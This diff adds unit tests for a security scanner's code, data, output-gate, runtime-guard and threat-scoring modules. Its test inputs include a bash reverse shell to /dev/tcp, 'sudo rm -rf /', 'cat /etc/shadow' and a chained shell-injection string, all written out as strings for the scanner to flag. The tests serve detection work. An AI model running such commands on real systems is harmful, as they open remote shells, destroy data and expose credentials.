@@ -8,6 +8,11 @@ include "src/scoring.cyr"
 include "src/lifecycle.cyr"
 include "src/scanning_types.cyr"
 include "src/scanning_secrets.cyr"
+include "src/scanning_code.cyr"
+include "src/scanning_data.cyr"
+include "src/scanning_gate.cyr"
+include "src/scanning_runtime.cyr"
+include "src/scanning_threat.cyr"
 
 fn test_backend_parse() {
     test_group("backend_parse");
@@ -323,6 +328,365 @@ fn test_scan_ssn() {
     return 0;
 }
 
+fn test_code_command_injection() {
+    test_group("code_command_injection");
+    var r = scan_result_new();
+    code_scan("child_process.exec('ls')", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "exec detected");
+    return 0;
+}
+
+fn test_code_reverse_shell() {
+    test_group("code_reverse_shell");
+    var r = scan_result_new();
+    code_scan("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "reverse shell detected");
+    assert_eq(ScanResult_worst_severity(r), Severity.CRITICAL, "critical");
+    return 0;
+}
+
+fn test_code_sudo() {
+    test_group("code_sudo");
+    var r = scan_result_new();
+    code_scan("sudo rm -rf /", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "sudo + rm -rf detected");
+    return 0;
+}
+
+fn test_code_sensitive_path() {
+    test_group("code_sensitive_path");
+    var r = scan_result_new();
+    code_scan("cat /etc/shadow", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "/etc/shadow detected");
+    return 0;
+}
+
+fn test_code_case_insensitive() {
+    test_group("code_case_insensitive");
+    var r = scan_result_new();
+    code_scan("EVAL('test')", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "uppercase EVAL still matched");
+    return 0;
+}
+
+fn test_code_clean() {
+    test_group("code_clean");
+    var r = scan_result_new();
+    code_scan("hello world\nstatus: ok\nresult: 42\n", r);
+    assert_eq(vec_len(ScanResult_findings(r)), 0, "no findings");
+    return 0;
+}
+
+fn test_data_visa() {
+    test_group("data_visa");
+    var r = scan_result_new();
+    data_scan("card: 4111111111111111 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "visa detected");
+    return 0;
+}
+
+fn test_data_mastercard() {
+    test_group("data_mastercard");
+    var r = scan_result_new();
+    data_scan("card: 5500000000000004 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "mastercard detected");
+    return 0;
+}
+
+fn test_data_amex() {
+    test_group("data_amex");
+    var r = scan_result_new();
+    data_scan("card: 378282246310005 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "amex detected");
+    return 0;
+}
+
+fn test_data_ipv4() {
+    test_group("data_ipv4");
+    var r = scan_result_new();
+    data_scan("server at 192.168.1.100 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "ipv4 detected");
+    return 0;
+}
+
+fn test_data_ipv4_rejects_version() {
+    test_group("data_ipv4_neg");
+    var r = scan_result_new();
+    data_scan("version 1.2.3 end", r);
+    # 1.2.3 is not a full IPv4
+    var v = ScanResult_findings(r);
+    var i = 0;
+    var found_ip = 0;
+    while (i < vec_len(v)) {
+        var f = vec_get(v, i);
+        if (streq(ScanFinding_category(f), "pii_network") == 1) { found_ip = 1; }
+        i = i + 1;
+    }
+    assert_eq(found_ip, 0, "1.2.3 is not IPv4");
+    return 0;
+}
+
+fn test_data_iban() {
+    test_group("data_iban");
+    var r = scan_result_new();
+    data_scan("IBAN: DE89370400440532013000 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "iban detected");
+    return 0;
+}
+
+fn test_data_phone() {
+    test_group("data_phone");
+    var r = scan_result_new();
+    data_scan("call me at (555) 123-4567 end", r);
+    assert(vec_len(ScanResult_findings(r)) >= 1, "phone detected");
+    return 0;
+}
+
+fn test_data_hipaa() {
+    test_group("data_hipaa");
+    var r = scan_result_new();
+    data_scan("patient record number: MRN-12345", r);
+    var v = ScanResult_findings(r);
+    var found = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var f = vec_get(v, i);
+        if (streq(ScanFinding_category(f), "compliance_hipaa") == 1) { found = 1; }
+        i = i + 1;
+    }
+    assert_eq(found, 1, "hipaa detected");
+    return 0;
+}
+
+fn test_data_gdpr() {
+    test_group("data_gdpr");
+    var r = scan_result_new();
+    data_scan("data subject right to erasure request", r);
+    var v = ScanResult_findings(r);
+    var found = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var f = vec_get(v, i);
+        if (streq(ScanFinding_category(f), "compliance_gdpr") == 1) { found = 1; }
+        i = i + 1;
+    }
+    assert_eq(found, 1, "gdpr detected");
+    return 0;
+}
+
+fn test_data_pci() {
+    test_group("data_pci");
+    var r = scan_result_new();
+    data_scan("cardholder data environment", r);
+    var v = ScanResult_findings(r);
+    var found = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var f = vec_get(v, i);
+        if (streq(ScanFinding_category(f), "compliance_pci") == 1) { found = 1; }
+        i = i + 1;
+    }
+    assert_eq(found, 1, "pci detected");
+    return 0;
+}
+
+fn test_data_soc2() {
+    test_group("data_soc2");
+    var r = scan_result_new();
+    data_scan("SOC 2 trust service criteria audit", r);
+    var v = ScanResult_findings(r);
+    var found = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var f = vec_get(v, i);
+        if (streq(ScanFinding_category(f), "compliance_soc2") == 1) { found = 1; }
+        i = i + 1;
+    }
+    assert_eq(found, 1, "soc2 detected");
+    return 0;
+}
+
+fn test_gate_pass_clean() {
+    test_group("gate_pass");
+    var er = exec_result_new();
+    ExecResult_set_stdout(er, "hello world");
+    var pol = ext_policy_default();
+    var sr = gate_apply(er, pol);
+    assert_eq(ScanResult_verdict(sr), ScanVerdict.PASS, "verdict pass");
+    return 0;
+}
+
+fn test_gate_block_private_key() {
+    test_group("gate_block_private_key");
+    var er = exec_result_new();
+    ExecResult_set_stdout(er, "-----BEGIN RSA PRIVATE KEY-----\nMIIEp...");
+    var pol = ext_policy_default();
+    var sr = gate_apply(er, pol);
+    assert_eq(ScanResult_verdict(sr), ScanVerdict.BLOCK, "verdict block");
+    assert_eq(ScanResult_worst_severity(sr), Severity.CRITICAL, "critical");
+    return 0;
+}
+
+fn test_gate_size_limit() {
+    test_group("gate_size_limit");
+    var er = exec_result_new();
+    ExecResult_set_stdout(er, "this is longer than 10 bytes");
+    var pol = ext_policy_default();
+    ExternalizationPolicy_set_max_artifact_size_bytes(pol, 10);
+    var sr = gate_apply(er, pol);
+    assert_eq(ScanResult_verdict(sr), ScanVerdict.BLOCK, "oversized blocked");
+    return 0;
+}
+
+fn test_gate_disabled() {
+    test_group("gate_disabled");
+    var er = exec_result_new();
+    ExecResult_set_stdout(er, "-----BEGIN RSA PRIVATE KEY-----");
+    var pol = ext_policy_default();
+    ExternalizationPolicy_set_enabled(pol, 0);
+    var sr = gate_apply(er, pol);
+    assert_eq(ScanResult_verdict(sr), ScanVerdict.PASS, "disabled pass");
+    return 0;
+}
+
+fn test_gate_stderr() {
+    test_group("gate_stderr");
+    var er = exec_result_new();
+    ExecResult_set_stdout(er, "clean");
+    ExecResult_set_stderr(er, "-----BEGIN RSA PRIVATE KEY-----");
+    var pol = ext_policy_default();
+    var sr = gate_apply(er, pol);
+    assert_eq(ScanResult_verdict(sr), ScanVerdict.BLOCK, "stderr secret blocked");
+    return 0;
+}
+
+fn test_runtime_blocked_command() {
+    test_group("runtime_blocked_cmd");
+    var cfg = runtime_guard_config_default();
+    var v = check_command("/bin/bash -c 'whoami'", cfg);
+    assert(vec_len(v) >= 1, "bash blocked");
+    var saw_blocked = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var vio = vec_get(v, i);
+        if (GuardViolation_violation_type(vio) == ViolationType.BLOCKED_COMMAND) {
+            saw_blocked = 1;
+        }
+        i = i + 1;
+    }
+    assert_eq(saw_blocked, 1, "BLOCKED_COMMAND violation present");
+    return 0;
+}
+
+fn test_runtime_allowed_command() {
+    test_group("runtime_allowed_cmd");
+    var cfg = runtime_guard_config_default();
+    var v = check_command("ls -la /tmp", cfg);
+    var saw_blocked = 0;
+    var i = 0;
+    while (i < vec_len(v)) {
+        var vio = vec_get(v, i);
+        if (GuardViolation_violation_type(vio) == ViolationType.BLOCKED_COMMAND) {
+            saw_blocked = 1;
+        }
+        i = i + 1;
+    }
+    assert_eq(saw_blocked, 0, "ls not in blocklist");
+    assert_eq(is_allowed_command("ls"), 1, "ls on allowlist");
+    return 0;
+}
+
+fn test_runtime_sensitive_path() {
+    test_group("runtime_sensitive_path");
+    var cfg = runtime_guard_config_default();
+    var v = check_command("cat /etc/shadow", cfg);
+    assert(vec_len(v) >= 1, "sensitive path flagged");
+    return 0;
+}
+
+fn test_runtime_shell_injection() {
+    test_group("runtime_shell_injection");
+    var cfg = runtime_guard_config_default();
+    var v = check_command("echo hi; bash -c 'whoami'", cfg);
+    assert(vec_len(v) >= 1, "shell injection flagged");
+    return 0;
+}
+
+fn test_runtime_fork_bomb() {
+    test_group("runtime_fork_bomb");
+    var cfg = runtime_guard_config_default();
+    assert_eq(check_fork_bomb(10, cfg), 0, "10 pids below limit");
+    var vio = check_fork_bomb(100, cfg);
+    assert(vio != 0, "100 pids over limit of 64");
+    assert_eq(GuardViolation_violation_type(vio), ViolationType.FORK_BOMB, "fork_bomb type");
+    return 0;
+}
+
+fn test_runtime_time_anomaly() {
+    test_group("runtime_time_anomaly");
+    var cfg = runtime_guard_config_default();
+    # 1000ms expected, multiplier 2.0 → threshold 2000
+    assert_eq(check_time_anomaly(1500, 1000, cfg), 0, "1500 under 2000");
+    var vio = check_time_anomaly(3000, 1000, cfg);
+    assert(vio != 0, "3000 > 2000 threshold");
+    return 0;
+}
+
+fn test_threat_benign() {
+    test_group("threat_benign");
+    var findings = vec_new();
+    var a = classify_threat(findings);
+    assert_eq(ThreatAssessment_intent_score_x1000(a), 0, "empty = 0");
+    assert_eq(ThreatAssessment_classification(a), ThreatTier.BENIGN, "benign");
+    assert_eq(ThreatAssessment_escalation(a), EscalationTier.TIER1_LOG, "tier1");
+    return 0;
+}
+
+fn test_threat_suspicious() {
+    test_group("threat_suspicious");
+    var findings = vec_new();
+    # Single low-severity finding: weight 150, no amplifier -> 150 (suspicious range)
+    vec_push(findings, finding_new("secrets", Severity.LOW, "pii", "minor", 0));
+    vec_push(findings, finding_new("secrets", Severity.MEDIUM, "pii", "more", 0));
+    var a = classify_threat(findings);
+    # 150 + 350 = 500. One stage (pii → EXFILTRATION) → amplifier 1.0 → 500
+    assert(ThreatAssessment_intent_score_x1000(a) >= 200, "suspicious+");
+    return 0;
+}
+
+fn test_threat_malicious_coord() {
+    test_group("threat_malicious_coordinated");
+    # 3 critical findings across 3 stages → amplifier 1.5x → exceed 1.0
+    var findings = vec_new();
+    vec_push(findings, finding_new("secrets", Severity.CRITICAL, "private_key", "k", 0));
+    vec_push(findings, finding_new("code", Severity.CRITICAL, "command_injection", "c", 0));
+    vec_push(findings, finding_new("code", Severity.CRITICAL, "data_exfiltration", "d", 0));
+    var a = classify_threat(findings);
+    assert_eq(ThreatAssessment_classification(a), ThreatTier.MALICIOUS, "malicious");
+    assert_eq(ThreatAssessment_escalation(a), EscalationTier.TIER4_REVOKE, "revoke");
+    assert_eq(vec_len(ThreatAssessment_kill_chain_stages(a)), 3, "3 unique stages");
+    return 0;
+}
+
+fn test_kill_chain_stage_names() {
+    test_group("kill_chain_names");
+    assert_eq(streq(kill_chain_stage_name(KillChainStage.RECONNAISSANCE), "reconnaissance"), 1, "recon");
+    assert_eq(streq(kill_chain_stage_name(KillChainStage.EXFILTRATION), "exfiltration"), 1, "exfil");
+    assert_eq(streq(threat_tier_name(ThreatTier.MALICIOUS), "malicious"), 1, "malicious");
+    assert_eq(streq(escalation_tier_name(EscalationTier.TIER4_REVOKE), "tier4_revoke"), 1, "tier4");
+    return 0;
+}
+
+fn test_verdict_determination() {
+    test_group("verdict_determination");
+    var pol = ext_policy_default();
+    assert_eq(determine_verdict(Severity.INFO, pol), ScanVerdict.PASS, "info=pass");
+    assert_eq(determine_verdict(Severity.LOW, pol), ScanVerdict.WARN, "low=warn");
+    assert_eq(determine_verdict(Severity.HIGH, pol), ScanVerdict.QUARANTINE, "high=quarantine");
+    assert_eq(determine_verdict(Severity.CRITICAL, pol), ScanVerdict.BLOCK, "critical=block");
+    return 0;
+}
+
 fn test_scan_multiple() {
     test_group("scan_multiple");
     var r = scan_result_new();
@@ -358,6 +722,39 @@ fn main() {
     test_scan_connection_string();
     test_scan_ssn();
     test_scan_multiple();
+    test_code_command_injection();
+    test_code_reverse_shell();
+    test_code_sudo();
+    test_code_sensitive_path();
+    test_code_case_insensitive();
+    test_code_clean();
+    test_data_visa();
+    test_data_mastercard();
+    test_data_amex();
+    test_data_ipv4();
+    test_data_ipv4_rejects_version();
+    test_data_iban();
+    test_data_phone();
+    test_data_hipaa();
+    test_data_gdpr();
+    test_data_pci();
+    test_data_soc2();
+    test_gate_pass_clean();
+    test_gate_block_private_key();
+    test_gate_size_limit();
+    test_gate_disabled();
+    test_gate_stderr();
+    test_verdict_determination();
+    test_runtime_blocked_command();
+    test_runtime_allowed_command();
+    test_runtime_sensitive_path();
+    test_runtime_shell_injection();
+    test_runtime_fork_bomb();
+    test_runtime_time_anomaly();
+    test_threat_benign();
+    test_threat_suspicious();
+    test_threat_malicious_coord();
+    test_kill_chain_stage_names();
     return assert_summary();
 }
 
